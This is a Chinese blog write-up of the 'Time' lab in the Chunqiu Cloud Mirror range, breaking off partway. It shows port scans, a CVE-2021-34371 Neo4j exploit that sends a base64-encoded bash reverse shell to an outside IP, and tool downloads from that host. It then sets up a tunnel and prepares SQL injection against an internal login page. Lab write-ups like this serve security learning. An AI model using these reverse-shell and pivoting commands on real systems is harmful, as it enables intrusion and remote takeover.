<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="CVE-2021-34371、ASREPRoast攻击、SIDHistory攻击"><title>春秋云镜Time</title><link rel=canonical href=https://baozongwi.xyz/p/springautumn-cloudmirror-time/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="春秋云镜Time"><meta property='og:description' content="CVE-2021-34371、ASREPRoast攻击、SIDHistory攻击"><meta property='og:url' content='https://baozongwi.xyz/p/springautumn-cloudmirror-time/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Pentest'><meta property='article:published_time' content='2025-08-26T21:45:29+08:00'><meta property='article:modified_time' content='2025-08-26T21:45:29+08:00'><meta name=twitter:title content="春秋云镜Time"><meta name=twitter:description content="CVE-2021-34371、ASREPRoast攻击、SIDHistory攻击"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag3flag4>flag3&&amp;flag4</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/>春秋云镜</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/springautumn-cloudmirror-time/>春秋云镜Time</a></h2><h3 class=article-subtitle>CVE-2021-34371、ASREPRoast攻击、SIDHistory攻击</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-08-26T21:45:29+08:00>Aug 26, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>17 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 169 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=flag1>flag1</h2><p>先用fscan扫一下靶机<code>./fscan -h 39.99.225.0 -p 1-65535</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>39.99.225.0:22 open
</span></span><span class=line><span class=cl>39.99.225.0:1337 open
</span></span><span class=line><span class=cl>39.99.225.0:7474 open
</span></span><span class=line><span class=cl>39.99.225.0:7473 open
</span></span><span class=line><span class=cl>39.99.225.0:7687 open
</span></span><span class=line><span class=cl>39.99.225.0:43459 open
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>6</span>
</span></span><span class=line><span class=cl>start vulscan
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.99.225.0:7474   code:303 len:0      title:None 跳转url: http://39.99.225.0:7474/browser/
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.99.225.0:7474/browser/ code:200 len:3279   title:Neo4j Browser
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle https://39.99.225.0:7473  code:303 len:0      title:None 跳转url: https://39.99.225.0:7473/browser/
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle https://39.99.225.0:7687  code:400 len:50     title:None
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle https://39.99.225.0:7473/browser/ code:200 len:3279   title:Neo4j Browser
</span></span></code></pre></td></tr></table></div></div><p>7687端口开着的，Neo4j Browser，存在nday <strong>CVE-2021-34371</strong> <a class=link href=https://github.com/zwjjustdoit/CVE-2021-34371.jar target=_blank rel=noopener>https://github.com/zwjjustdoit/CVE-2021-34371.jar</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/8.137.148.227/9999 0&gt;&amp;1&#34;</span> <span class=p>|</span> base64
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>java -jar ./rhino_gadget.jar rmi://39.99.225.0:1337 <span class=s2>&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNy4xNDguMjI3Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=flag2>flag2</h2><p>搭建代理和传fscan，我们把工具放在服务器的网站根目录，然后wget去下载</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> /tmp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>wget http://8.137.148.227/fscan
</span></span><span class=line><span class=cl>wget http://8.137.148.227/agent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chmod +x *
</span></span></code></pre></td></tr></table></div></div><p>获得内网的信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.6.38     is alive
</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.6.36     is alive
</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.6.25     is alive
</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.6.12     is alive
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Icmp alive hosts len is: <span class=m>4</span>
</span></span><span class=line><span class=cl>172.22.6.36:22 open
</span></span><span class=line><span class=cl>172.22.6.38:22 open
</span></span><span class=line><span class=cl>172.22.6.12:445 open
</span></span><span class=line><span class=cl>172.22.6.25:445 open
</span></span><span class=line><span class=cl>172.22.6.12:139 open
</span></span><span class=line><span class=cl>172.22.6.25:139 open
</span></span><span class=line><span class=cl>172.22.6.25:135 open
</span></span><span class=line><span class=cl>172.22.6.12:135 open
</span></span><span class=line><span class=cl>172.22.6.38:80 open
</span></span><span class=line><span class=cl>172.22.6.12:88 open
</span></span><span class=line><span class=cl>172.22.6.36:7687 open
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>11</span>
</span></span><span class=line><span class=cl>start vulscan
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.6.25
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN2019
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.6.25
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.6.12
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>DC-PROGAME
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.6.12
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.6.25     XIAORANG<span class=se>\W</span>IN2019              
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> OsInfo 172.22.6.12  <span class=o>(</span>Windows Server <span class=m>2016</span> Datacenter 14393<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.6.12     <span class=o>[</span>+<span class=o>]</span> DC:DC-PROGAME.xiaorang.lab       Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle https://172.22.6.36:7687  code:400 len:50     title:None
</span></span></code></pre></td></tr></table></div></div><ul><li>172.22.6.38 web机器，可以后台登录？</li><li>172.22.6.36 已经被控</li><li>172.22.6.25 XIAORANG\WIN2019</li><li>172.22.6.12 DC-PROGAME.xiaorang.lab</li></ul><p>搭建代理，准备控制38</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nohup ./agent -bind 0.0.0.0:10010 &gt; agent.log 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo ./proxy -selfcert -laddr <span class=s2>&#34;0.0.0.0:10001&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>connect_agent --ip 39.99.225.0:10010
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>interface_list
</span></span><span class=line><span class=cl>session
</span></span><span class=line><span class=cl>autoroute
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nohup ./gost -L<span class=o>=</span>socks://:1080 &gt; gost.log 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查看是否开启</span>
</span></span><span class=line><span class=cl>ss -luntp
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-time/1.png width=1394 height=687 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>POST /index.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 172.22.6.38
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.9,en<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.8
</span></span><span class=line><span class=cl>Origin: http://172.22.6.38
</span></span><span class=line><span class=cl>Referer: http://172.22.6.38/index.php
</span></span><span class=line><span class=cl>Cache-Control: max-age<span class=o>=</span><span class=m>0</span>
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: <span class=m>1</span>
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 <span class=o>(</span>Windows NT 10.0<span class=p>;</span> Win64<span class=p>;</span> x64<span class=o>)</span> AppleWebKit/537.36 <span class=o>(</span>KHTML, like Gecko<span class=o>)</span> Chrome/136.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.9,image/avif,image/webp,image/apng,*/*<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.8,application/signed-exchange<span class=p>;</span><span class=nv>v</span><span class=o>=</span>b3<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.7
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: <span class=m>34</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>username</span><span class=o>=</span>admin<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span>fadfadfadf
</span></span></code></pre></td></tr></table></div></div><p>我觉得Sqlmap可以打<code>sqlmap -r 1.txt --dump</code>直接一把梭哈了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
